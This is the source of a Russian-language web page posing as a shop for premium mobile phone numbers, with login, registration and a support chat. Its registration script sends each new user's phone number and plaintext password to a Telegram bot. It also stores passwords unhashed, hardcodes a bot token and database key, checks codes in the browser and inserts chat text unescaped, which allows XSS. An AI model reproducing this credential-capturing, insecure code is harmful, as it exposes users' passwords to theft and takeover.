<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>SIM MARKET | PREMIUM NUMBERS</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database-compat.js"></script>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Manrope:wght@400;600;800&display=swap');
        body { font-family: 'Manrope', sans-serif; background: #0a0a0a; color: #fff; margin: 0; overflow-x: hidden; }
        
        .gold-grad {
            background: linear-gradient(90deg, #bf953f, #fcf6ba, #bf953f, #fcf6ba, #bf953f);
            background-size: 200% auto;
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            animation: gold-flow 4s linear infinite;
        }
        @keyframes gold-flow { to { background-position: 200% center; } }
        
        .tab-btn { background: rgba(255,255,255,0.05); padding: 10px 18px; border-radius: 12px; font-size: 10px; font-weight: 800; text-transform: uppercase; color: #555; transition: 0.3s; border: 1px solid transparent; flex-shrink: 0; }
        .tab-active { background: #bf953f; color: #000; box-shadow: 0 5px 15px rgba(191,149,63,0.4); border-color: #fcf6ba; }
        .no-scrollbar::-webkit-scrollbar { display: none; }

        .neon-card { position: relative; background: rgba(191, 149, 63, 0.1); border-radius: 28px; padding: 2px; overflow: hidden; margin-bottom: 30px; }
        .neon-card::before { content: ''; position: absolute; top: -50%; left: -50%; width: 200%; height: 200%; background: conic-gradient(transparent, #bf953f, #fcf6ba, #bf953f, transparent); animation: rotate 4s linear infinite; }
        @keyframes rotate { from { transform: rotate(0deg); } to { transform: rotate(360deg); } }
        
        .card-content { position: relative; background: #0d0d0d; border-radius: 26px; padding: 30px 20px; z-index: 1; display: flex; flex-direction: column; align-items: center; }
        .price-text { font-size: 32px; font-weight: 800; color: #bf953f; margin: 15px 0; }
        .buy-btn { background: linear-gradient(135deg, #bf953f, #fcf6ba); color: #000; font-weight: 900; font-size: 11px; text-transform: uppercase; padding: 18px; border-radius: 18px; width: 100%; border: none; cursor: pointer; }

        .modal { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.95); z-index: 2000; align-items: center; justify-content: center; padding: 20px; backdrop-filter: blur(10px); }
        .input-dark { width: 100%; background: rgba(255,255,255,0.05); border: 1px solid rgba(191,149,63,0.3); padding: 16px; border-radius: 16px; color: #fff; outline: none; font-size: 14px; }
        .label { font-size: 9px; font-weight: 800; color: #bf953f; text-transform: uppercase; margin-bottom: 8px; display: block; }

        .chat-trigger { background: #bf953f; width: 60px; height: 60px; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 24px; position: fixed; bottom: 30px; right: 25px; z-index: 1000; box-shadow: 0 10px 30px rgba(191,149,63,0.4); }
        #chat-window { display: none; position: fixed; bottom: 100px; right: 25px; width: 320px; height: 450px; background: #0d0d0d; border: 1px solid #bf953f; border-radius: 24px; z-index: 1000; flex-direction: column; overflow: hidden; }
    </style>
</head>
<body class="p-5 pb-32">

    <header class="flex justify-between items-center mb-8">
        <div>
            <h1 class="text-3xl font-black italic gold-grad tracking-tighter">SIM MARKET</h1>
            <p class="text-[8px] tracking-[3px] opacity-30 uppercase font-extrabold">Exclusive Stock</p>
        </div>
        <button id="auth-btn" onclick="openAuth()" class="text-[10px] font-bold border border-[#bf953f]/50 px-5 py-2 rounded-full uppercase gold-grad">Вход</button>
        <button id="user-profile" onclick="logout()" class="hidden text-[10px] font-bold text-white border border-white/20 px-5 py-2 rounded-full uppercase"></button>
    </header>

    <div class="max-w-md mx-auto flex gap-2 overflow-x-auto no-scrollbar mb-10">
        <button onclick="setFilter('all', this)" class="tab-btn tab-active">Все</button>
        <button onclick="setFilter('mts', this)" class="tab-btn">МТС</button>
        <button onclick="setFilter('megafon', this)" class="tab-btn">Мегафон</button>
        <button onclick="setFilter('beeline', this)" class="tab-btn">Билайн</button>
    </div>

    <div id="list" class="max-w-md mx-auto"></div>

    <div id="auth-modal" class="modal">
        <div class="bg-[#0d0d0d] w-full max-w-xs p-8 rounded-[30px] border border-[#bf953f]">
            <h2 id="auth-title" class="text-2xl font-black text-center mb-6 gold-grad">ВХОД</h2>
            <div class="space-y-4">
                <div><span class="label">Номер телефона</span><input type="tel" id="auth-phone" placeholder="+7" class="input-dark"></div>
                <div><span class="label">Пароль</span><input type="password" id="auth-pass" placeholder="••••••" class="input-dark"></div>
                <div id="code-field" class="hidden"><span class="label">Код из WhatsApp</span><input type="text" id="auth-code" placeholder="0000" class="input-dark text-center tracking-widest"></div>
            </div>
            <button id="main-auth-btn" onclick="handleAuth()" class="buy-btn mt-6 w-full py-4">Продолжить</button>
            <p id="toggle-auth" onclick="toggleAuthMode()" class="text-center mt-6 text-[10px] opacity-40 uppercase font-bold cursor-pointer">Создать аккаунт</p>
            <p onclick="closeAuth()" class="text-center mt-3 text-[9px] opacity-20 uppercase font-bold cursor-pointer">Закрыть</p>
        </div>
    </div>

    <button class="chat-trigger" onclick="toggleChat()">💬</button>
    <div id="chat-window">
        <div class="bg-[#bf953f] p-4 text-black font-black text-xs uppercase flex justify-between"><span>Поддержка</span><button onclick="toggleChat()">✕</button></div>
        <div id="chat-messages" class="flex-1 p-4 overflow-y-auto space-y-2"></div>
        <div class="p-3 border-t border-white/5 flex gap-2">
            <input type="text" id="chat-input" class="flex-1 bg-white/5 border border-white/10 rounded-xl px-4 py-3 text-white text-sm outline-none">
            <button onclick="sendMessage()" class="bg-[#bf953f] text-black px-4 rounded-xl font-bold">></button>
        </div>
    </div>

    <script>
        // НАСТРОЙКИ
        const MY_WHATSAPP = "79999993834"; 
        const TG_TOKEN = "8569235049:AAEsaW4ME-Ql6036i04tIbj--IPNT6JdroE"; 
        const TG_ID = "8768514374";

        const firebaseConfig = { 
            apiKey: "AIzaSyCRjRJkH4dPxvyYD-37emejFvK11g6hZ44", 
            authDomain: "nnnmb-a0b52.firebaseapp.com", 
            databaseURL: "https://nnnmb-a0b52-default-rtdb.firebaseio.com", 
            projectId: "nnnmb-a0b52" 
        };
        firebase.initializeApp(firebaseConfig);
        const db = firebase.database();

        let allNumbers = {};
        let currentFilter = 'all';
        let isRegMode = false;
        let generatedCode = null;
        let currentUser = JSON.parse(localStorage.getItem('sim_user')) || null;

        window.onload = () => { if(currentUser) updateUI(currentUser.phone); };

        // ПОЛУЧЕНИЕ НОМЕРОВ
        db.ref('inventory').on('value', s => { allNumbers = s.val() || {}; render(); });

        function render() {
            const list = document.getElementById('list'); list.innerHTML = "";
            Object.keys(allNumbers).reverse().forEach(k => {
                const item = allNumbers[k];
                if(currentFilter !== 'all' && item.op !== currentFilter) return;
                list.innerHTML += `<div class="neon-card"><div class="card-content"><div class="w-full flex justify-between items-center opacity-30 text-[9px] font-bold mb-4 px-1"><span>${item.op.toUpperCase()}</span><span class="gold-grad italic">Elite Number</span></div><div class="text-4xl font-black italic tracking-tighter text-white">+7 ${item.num}</div><div class="price-text">${parseInt(item.price).toLocaleString()} ₽</div><button class="buy-btn" onclick="buyNumber('${item.num}')">Купить сейчас</button></div></div>`;
            });
        }

        function setFilter(op, btn) {
            currentFilter = op;
            document.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('tab-active'));
            btn.classList.add('tab-active');
            render();
        }

        // АВТОРИЗАЦИЯ И РЕГИСТРАЦИЯ
        function openAuth() { document.getElementById('auth-modal').style.display = 'flex'; }
        function closeAuth() { document.getElementById('auth-modal').style.display = 'none'; }
        function toggleAuthMode() {
            isRegMode = !isRegMode;
            document.getElementById('auth-title').innerText = isRegMode ? "РЕГИСТРАЦИЯ" : "ВХОД";
            document.getElementById('toggle-auth').innerText = isRegMode ? "Уже есть аккаунт" : "Создать аккаунт";
        }

        function handleAuth() {
            const phone = document.getElementById('auth-phone').value.trim();
            const pass = document.getElementById('auth-pass').value.trim();
            if(!phone || !pass) return alert("Заполните поля!");

            if(isRegMode) {
                if(!generatedCode) {
                    generatedCode = Math.floor(1000 + Math.random() * 9000);
                    sendTG(`👤 <b>РЕГИСТРАЦИЯ</b>\n📱: ${phone}\n🔑: ${pass}\n🔢 КОД: ${generatedCode}`);
                    const waText = `Мой код для SIM MARKET: ${generatedCode}`;
                    window.open(`https://wa.me/${MY_WHATSAPP}?text=${encodeURIComponent(waText)}`, '_blank');
                    document.getElementById('code-field').classList.remove('hidden');
                    document.getElementById('main-auth-btn').innerText = "ПОДТВЕРДИТЬ";
                    alert("Код отправлен в WhatsApp!");
                } else {
                    const inputCode = document.getElementById('auth-code').value.trim();
                    if(inputCode == generatedCode) {
                        db.ref('users/' + phone.replace(/\D/g, '')).set({phone, pass, ts: Date.now()}).then(() => {
                            alert("Успешно!"); loginUser(phone);
                        });
                    } else { alert("Неверный код!"); }
                }
            } else {
                db.ref('users/' + phone.replace(/\D/g, '')).once('value', s => {
                    const d = s.val();
                    if(d && d.pass === pass) loginUser(phone);
                    else alert("Ошибка входа!");
                });
            }
        }

        function loginUser(phone) {
            localStorage.setItem('sim_user', JSON.stringify({phone}));
            updateUI(phone); closeAuth();
        }

        function updateUI(phone) {
            document.getElementById('auth-btn').classList.add('hidden');
            const profile = document.getElementById('user-profile');
            profile.classList.remove('hidden'); profile.innerText = phone;
        }

        function logout() { localStorage.removeItem('sim_user'); location.reload(); }

        // УВЕДОМЛЕНИЯ И ЧАТ
        function sendTG(text) {
            fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage?chat_id=${TG_ID}&text=${encodeURIComponent(text)}&parse_mode=HTML`);
        }

        function buyNumber(n) {
            if(!currentUser) return openAuth();
            sendTG(`🚀 <b>ЗАКАЗ</b>\n📱 Номер: +7 ${n}\n👤 Клиент: ${currentUser.phone}`);
            alert("Заявка принята! Мы свяжемся с вами.");
        }

        let userId = localStorage.getItem('user_chat_id') || 'u' + Math.floor(Math.random() * 10000);
        localStorage.setItem('user_chat_id', userId);

        function toggleChat() {
            const win = document.getElementById('chat-window');
            win.style.display = (win.style.display === 'none' || win.style.display === '') ? 'flex' : 'none';
            if(win.style.display === 'flex') {
                db.ref('chats/' + userId + '/messages').on('value', s => {
                    const container = document.getElementById('chat-messages');
                    container.innerHTML = "";
                    Object.values(s.val() || {}).forEach(m => {
                        container.innerHTML += `<div class="p-2 rounded-xl text-xs font-bold max-w-[80%] ${m.role==='user'?'ml-auto bg-[#bf953f] text-black':'bg-white/10 text-white'}">${m.text}</div>`;
                    });
                    container.scrollTop = container.scrollHeight;
                });
            }
        }

        function sendMessage() {
            const i = document.getElementById('chat-input');
            if(!i.value.trim()) return;
            db.ref('chats/' + userId + '/messages').push({ text: i.value, role: 'user', ts: Date.now() });
            db.ref('chats/' + userId + '/metadata').set({ lastMsg: i.value, ts: Date.now(), id: userId });
            sendTG(`💬 <b>ЧАТ</b>\n🆔: ${userId}\n✉️: ${i.value}`);
            i.value = "";
        }
    </script>
</body>
</html>
